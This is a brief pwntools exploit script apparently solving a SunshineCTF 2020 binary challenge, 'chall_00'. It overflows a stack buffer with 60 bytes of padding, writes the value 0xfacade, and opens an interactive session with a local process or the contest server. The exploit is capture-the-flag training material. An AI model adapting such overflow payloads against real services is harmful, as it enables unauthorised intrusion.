#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_00')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30000)
else:
    io = process(context.binary.path)
    
print(io.recvline())

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO'
payload = p32(0xfacade)
exploit = flat(buffer, payload)

print("Sending: ", exploit)
io.sendline(flat(buffer, payload))
io.interactive()
